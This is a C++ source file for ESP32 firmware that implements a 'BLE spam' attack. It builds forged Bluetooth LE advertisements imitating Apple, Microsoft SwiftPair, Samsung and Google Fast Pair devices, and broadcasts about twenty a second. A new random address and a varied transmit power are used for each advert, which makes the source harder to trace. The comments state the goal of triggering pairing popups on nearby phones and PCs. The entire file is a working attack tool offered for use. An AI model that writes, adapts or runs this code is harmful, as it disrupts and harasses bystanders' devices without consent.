#include "BleSpam.h"

#include "Globals.h"
#include "BleScanner.h"
#include "MeshNode.h"

#include <NimBLEDevice.h>

// NimBLE host function to set the controller's random static address. Declared
// here so we don't depend on the internal host/ include path being exposed.
extern "C" int ble_hs_id_set_rnd(const uint8_t* rnd_addr);

namespace {

constexpr uint32_t ADV_INTERVAL_MS = 50;   // ~20 adverts/sec

BleSpamType        s_type   = BleSpamType::None;
NimBLEAdvertising* s_adv    = nullptr;
bool               s_active = false;
uint32_t           s_count  = 0;
uint32_t           s_lastMs = 0;

// ── Payload pools ──────────────────────────────────────────────────────────

// Apple Continuity model IDs (Proximity Pairing type 0x0F). A random one is
// chosen per advert so the popups cycle through AirPods, AppleTV, HomePod, etc.
const uint16_t APPLE_MODELS[] = {
  0x2002, 0x2003, 0x2005, 0x2006, 0x2007,
  0x2009, 0x200A, 0x200B, 0x200C, 0x200D,
  0x200E, 0x200F, 0x2010, 0x2011, 0x2012,
  0x2013, 0x2014,
  0x0001, 0x0002, 0x0003, 0x0004, 0x0005,
  0x0006, 0x0007, 0x0008, 0x0009, 0x000A,
  0x000B, 0x000C,
};
constexpr size_t APPLE_MODEL_COUNT = sizeof(APPLE_MODELS) / sizeof(APPLE_MODELS[0]);

// Microsoft SwiftPair device IDs (subtype 0x03, sub-subtype 0x00).
// These correspond to common peripheral classes Windows recognises.
const uint8_t SWIFTPAIR_DEVICES[] = {
  0x01,  // mouse
  0x02,  // keyboard
  0x03,  // headphones
  0x04,  // speaker
  0x05,  // gamepad
  0x06,  // joystick
  0x07,  // pen
  0x08,  // remote
};
constexpr size_t SWIFTPAIR_DEVICE_COUNT =
  sizeof(SWIFTPAIR_DEVICES) / sizeof(SWIFTPAIR_DEVICES[0]);

// Samsung Galaxy Watch / Buds model IDs (manufacturer data 0x0075).
const uint16_t SAMSUNG_MODELS[] = {
  0x0001,  // Galaxy Watch
  0x0002,  // Galaxy Watch Active
  0x0003,  // Galaxy Buds
  0x0004,  // Galaxy Buds+
  0x0005,  // Galaxy Buds Live
  0x0006,  // Galaxy Buds Pro
  0x0007,  // Galaxy Watch3
  0x0008,  // Galaxy Watch4
  0x0009,  // Galaxy Watch4 Classic
  0x000A,  // Galaxy Buds2
  0x000B,  // Galaxy Watch5
  0x000C,  // Galaxy Watch5 Pro
  0x000D,  // Galaxy Buds2 Pro
};
constexpr size_t SAMSUNG_MODEL_COUNT =
  sizeof(SAMSUNG_MODELS) / sizeof(SAMSUNG_MODELS[0]);

// Google Fast Pair model IDs (3-byte, LE). These are real Fast Pair model IDs
// that Android devices treat as nearby pair-able peripherals.
const uint32_t FASTPAIR_MODELS[] = {
  0x0000F0,  // Pixel Buds
  0x0001F0,  // Pixel Buds A-Series
  0x0002F0,  // Pixel Buds Pro
  0x0003F0,  // Pixel Buds Pro 2
  0x000047,  // (widely used public spam ID)
  0x0000F1,  // Galaxy Buds (via Fast Pair)
};
constexpr size_t FASTPAIR_MODEL_COUNT =
  sizeof(FASTPAIR_MODELS) / sizeof(FASTPAIR_MODELS[0]);

// ── Payload builders ───────────────────────────────────────────────────────
// Each writes a raw AD structure into `out` and returns its byte length via
// `outLen`. Layouts match the respective vendor specs.

void buildApplePayload(uint8_t* out, size_t* outLen) {
  const uint16_t model = APPLE_MODELS[esp_random() % APPLE_MODEL_COUNT];
  size_t i = 0;
  out[i++] = 0x0E;                       // AD length
  out[i++] = 0xFF;                       // manufacturer specific data
  out[i++] = 0x4C;                       // Apple company ID (LE)
  out[i++] = 0x00;
  out[i++] = 0x0F;                       // proximity pairing type
  out[i++] = 0x08;                       // Apple data length
  out[i++] = (uint8_t)(model & 0xFF);    // model ID (LE)
  out[i++] = (uint8_t)(model >> 8);
  out[i++] = 0x55;                       // status
  out[i++] = (uint8_t)(esp_random() & 0xFF);
  out[i++] = (uint8_t)(esp_random() % 101);
  out[i++] = (uint8_t)(esp_random() & 0xFF);
  out[i++] = (uint8_t)(esp_random() & 0xFF);
  *outLen = i;
}

void buildSwiftPairPayload(uint8_t* out, size_t* outLen) {
  const uint8_t device = SWIFTPAIR_DEVICES[esp_random() % SWIFTPAIR_DEVICE_COUNT];
  size_t i = 0;
  out[i++] = 0x0E;                       // AD length
  out[i++] = 0xFF;                       // manufacturer specific data
  out[i++] = 0x06;                       // Microsoft company ID (LE)
  out[i++] = 0x00;
  out[i++] = 0x03;                       // SwiftPair subtype
  out[i++] = 0x00;                       // sub-subtype
  out[i++] = device;                     // device class
  out[i++] = (uint8_t)(esp_random() & 0xFF);
  out[i++] = (uint8_t)(esp_random() & 0xFF);
  out[i++] = (uint8_t)(esp_random() & 0xFF);
  out[i++] = (uint8_t)(esp_random() & 0xFF);
  *outLen = i;
}

void buildSamsungPayload(uint8_t* out, size_t* outLen) {
  const uint16_t model = SAMSUNG_MODELS[esp_random() % SAMSUNG_MODEL_COUNT];
  size_t i = 0;
  out[i++] = 0x10;                       // AD length
  out[i++] = 0xFF;                       // manufacturer specific data
  out[i++] = 0x75;                       // Samsung company ID (LE)
  out[i++] = 0x00;
  out[i++] = 0x01;                       // Samsung watch/buds subtype
  out[i++] = 0x00;
  out[i++] = (uint8_t)(model & 0xFF);    // model ID (LE)
  out[i++] = (uint8_t)(model >> 8);
  out[i++] = (uint8_t)(esp_random() & 0xFF);
  out[i++] = (uint8_t)(esp_random() & 0xFF);
  out[i++] = (uint8_t)(esp_random() & 0xFF);
  out[i++] = (uint8_t)(esp_random() & 0xFF);
  *outLen = i;
}

void buildFastPairPayload(uint8_t* out, size_t* outLen) {
  const uint32_t model = FASTPAIR_MODELS[esp_random() % FASTPAIR_MODEL_COUNT];
  size_t i = 0;
  out[i++] = 0x0F;                       // AD length
  out[i++] = 0xFF;                       // manufacturer specific data
  out[i++] = 0x06;                       // Microsoft company ID (LE) — reused
  out[i++] = 0x00;                       //   by Google for Fast Pair
  out[i++] = 0xFE;                       // Fast Pair service UUID (LE)
  out[i++] = 0x2C;
  out[i++] = (uint8_t)(model & 0xFF);    // model ID (3 bytes, LE)
  out[i++] = (uint8_t)((model >> 8) & 0xFF);
  out[i++] = (uint8_t)((model >> 16) & 0xFF);
  out[i++] = (uint8_t)(esp_random() & 0xFF);   // device nonce (3 bytes)
  out[i++] = (uint8_t)(esp_random() & 0xFF);
  out[i++] = (uint8_t)(esp_random() & 0xFF);
  *outLen = i;
}

// ── Shared advertising loop ────────────────────────────────────────────────

void sendAdv() {
  if (!s_adv) return;

  s_adv->stop();

  // Fresh random static address each advert (top two bits set = static random).
  uint8_t rnd[6];
  for (int i = 0; i < 6; ++i) rnd[i] = (uint8_t)(esp_random() & 0xFF);
  rnd[5] |= 0xC0;
  ble_hs_id_set_rnd(rnd);
  NimBLEDevice::setOwnAddrType(BLE_OWN_ADDR_RANDOM);

  uint8_t payload[31];
  size_t  payloadLen = 0;
  switch (s_type) {
    case BleSpamType::Apple:     buildApplePayload(payload, &payloadLen);     break;
    case BleSpamType::SwiftPair: buildSwiftPairPayload(payload, &payloadLen); break;
    case BleSpamType::Samsung:   buildSamsungPayload(payload, &payloadLen);   break;
    case BleSpamType::FastPair:  buildFastPairPayload(payload, &payloadLen);  break;
    default: return;
  }

  NimBLEAdvertisementData advData;
  advData.addData(payload, payloadLen);

  s_adv->setAdvertisementData(advData);
  s_adv->setConnectableMode(BLE_GAP_CONN_MODE_NON);
  s_adv->setDiscoverableMode(BLE_GAP_DISC_MODE_GEN);
  s_adv->setMinInterval(0x20);
  s_adv->setMaxInterval(0x40);

  // Vary apparent signal strength across adverts.
  static const int8_t TXP[] = {9, 6, 3, 0};
  NimBLEDevice::setPower(TXP[esp_random() % 4]);

  s_adv->start();
}

}  // namespace

void bleSpamBegin() {
  // Nothing to do until started; the NimBLE stack is brought up on demand.
}

void bleSpamStart(BleSpamType type) {
  if (type == BleSpamType::None) { bleSpamStop(); return; }
  if (s_active && s_type == type) return;

  if (meshCoreActive || meshNodeActive) {
    Serial.println("[BleSpam] refused: mesh mode owns the radio");
    return;
  }

  // If a different variant is running, tear it down first so the shared
  // advertising object is cleanly reinitialized for the new payload.
  if (s_active) {
    if (s_adv) s_adv->stop();
    s_active = false;
  }

  // Yield the radio from the wardriving BLE scanner; it auto-resumes on stop.
  bleScannerShutdown();

  if (!NimBLEDevice::isInitialized()) {
    NimBLEDevice::init("");
  }
  s_adv = NimBLEDevice::getAdvertising();
  if (!s_adv) {
    Serial.println("[BleSpam] no advertising object");
    return;
  }

  s_type = type;
  s_count = 0;
  s_lastMs = 0;
  s_active = true;
  sendAdv();     // fire the first advert immediately so the popup starts fast
  s_count++;
  Serial.printf("[BleSpam] started %s\n", bleSpamTypeName(type));
}

void bleSpamStop() {
  if (!s_active) return;
  if (s_adv) s_adv->stop();
  Serial.printf("[BleSpam] stopped %s (%lu adverts)\n",
                bleSpamTypeName(s_type), (unsigned long)s_count);
  s_active = false;
  s_type   = BleSpamType::None;
}

bool        bleSpamActive()      { return s_active; }
BleSpamType bleSpamCurrentType() { return s_type; }
uint32_t    bleSpamCount()       { return s_count; }

void bleSpamTick() {
  if (!s_active) return;
  const uint32_t now = millis();
  if (now - s_lastMs < ADV_INTERVAL_MS) return;
  s_lastMs = now;
  sendAdv();
  s_count++;
}

const char* bleSpamTypeName(BleSpamType type) {
  switch (type) {
    case BleSpamType::Apple:     return "APPLE";
    case BleSpamType::SwiftPair: return "SWIFTPAIR";
    case BleSpamType::Samsung:   return "SAMSUNG";
    case BleSpamType::FastPair:  return "FAST PAIR";
    case BleSpamType::None:
    default:                     return "OFF";
  }
}